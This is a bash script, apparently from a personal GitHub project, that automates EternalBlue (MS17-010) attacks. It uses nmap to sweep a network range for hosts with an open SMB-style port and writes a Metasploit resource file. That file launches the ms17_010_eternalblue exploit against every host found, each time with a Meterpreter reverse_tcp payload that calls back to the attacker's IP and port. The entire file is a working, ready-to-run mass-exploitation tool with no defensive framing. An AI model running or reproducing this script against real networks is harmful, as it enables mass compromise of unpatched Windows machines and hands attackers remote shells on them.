#!/bin/bash
#Everyone loves colorful terminals :D
cyan='\e[0;36m'
lightgreen='\e[0;32m'
white='\e[0;37m'
red='\e[0;31m'
service postgresql start
#Remove old files
if [ -e vuln-ips.txt ];then rm vuln-ips.txt;fi;if [ -e eternal-blue.rc ];then rm eternal-blue.rc;fi;
#Taking input and shit
echo;echo -e $cyan "*** MS17-010 Auto-Exploiter by Arun Chaudhary ***"
echo -e "\t*** https://github.com/its-arun ***"
echo -e $white;echo -e "Enter IP (Attacker's IP eg. 192.168.2.102):" $red
read lip
echo -e $white;echo -e "Enter port(eg. 31337):" $red
read lp
echo -e $white;echo -e "Enter Network IP (eg. 192.168.2.0/24):" $red
read nip
echo -e $white;echo -e "Targets available:" $lightgreen
#Creating list of IP addresses with port 455 open
touch vuln-ips.txt
nmap -Pn -p 455 --open $nip -oG - | awk '/Up$/{print $2 > "vuln-ips.txt"}';awk '{print $0}' vuln-ips.txt
if [[ -s vuln-ips.txt ]]
then
#Let's create metasploit resource file to make our job easy
	touch eternal-blue.rc
	echo "use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $lip
set LPORT $lp
set ExitOnSession false 
exploit -j -z
<ruby>
File.open(\"vuln-ips.txt\",\"r\") do |file|
	file.each_line do |ip|
               	run_single(\"use exploit/windows/smb/ms17_010_eternalblue\")
		run_single(\"set LHOST $lip\")
               	run_single(\"set PAYLOAD windows/meterpreter/reverse_tcp\")
               	run_single(\"set LPORT $lp\")
               	run_single(\"set RHOST #{ip}\")
               	run_single(\"set DisablePayloadHandler true\")
               	run_single(\"exploit -j -z\")
       	end
end 
</ruby>" >> eternal-blue.rc
	echo -e $lightgreen;echo -e "Exploitation Started"
	#Fun time
	msfconsole -r eternal-blue.rc
else
	echo -e $red "No targets found."
fi
